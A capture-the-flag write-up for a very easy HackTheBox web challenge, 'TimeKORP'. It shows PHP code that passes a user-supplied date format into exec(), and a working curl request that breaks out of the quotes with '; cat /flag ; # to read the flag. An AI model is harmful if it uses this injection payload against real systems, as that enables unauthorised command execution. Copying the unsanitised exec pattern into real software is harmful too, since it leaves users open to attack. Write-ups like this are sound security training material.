# TimeKORP

# TimeKORP

### Description

POINTS: 425\

\
DIFFICULTY: very easy

Are you ready to unravel the mysteries and expose the truth hidden within KROP's digital domain? Join the challenge and prove your prowess in the world of cybersecurity. Remember, time is money, but in this case, the rewards may be far greater than you imagine.

### Analysis

Model:

```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```

Controller:

```php
<?php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```

Model object gets format for timestamp, on `getTime()` method it gets executed as system command and result is returned back to us. Because the input can be manipulated by user this makes application vulnerable to Command Injection.

### Solution

To achive command execution we first need to escape the quotes of format, then inject the command and in this case comment out anything after.

```powershell
# '; cat /flag ; #
➜ curl 'http://94.237.60.39:34999/?format=%Y-%m-%d%27;%20cat%20/flag;%23' -s | sls HTB

        <h1 class="jumbotron-heading">><span class='text-muted'>It's</span> HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}<s
pan class='text-muted'>.</span></h1>
```

::: warning :warning:
Directly passing `#` into url will not get interpreted as bash comment, because `#` is part of url. Instead you can URLEncode and use it like so. `#` -> `\x23` -> `%23`
:::

::: tip Flag
`HTB{t1m3\_f0r\_th3\_ult1m4t3\_pwn4g3}`
:::
